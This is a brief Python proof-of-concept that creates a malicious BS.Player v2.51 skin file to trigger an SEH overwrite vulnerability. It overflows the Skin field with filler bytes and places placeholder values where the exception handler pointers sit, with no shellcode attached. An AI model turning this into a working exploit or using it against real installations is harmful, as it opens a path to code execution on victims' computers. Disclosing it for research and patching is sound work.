# BS.Player v2.51
# SEH Overwrite Vulnerability
# http://www.mertsarica.com

junk = "[Options]\nSkin="

vulnerability = junk + "\x41"*496 + "\x42"*4 + "\x43"*4

try: 
   vulnerable = open("vulnerable.bsi",'w') 
   vulnerable.write(vulnerability) 
   vulnerable.close() 
   print "Vulnerable file created!\n"
except: 
   print "Error occured!"
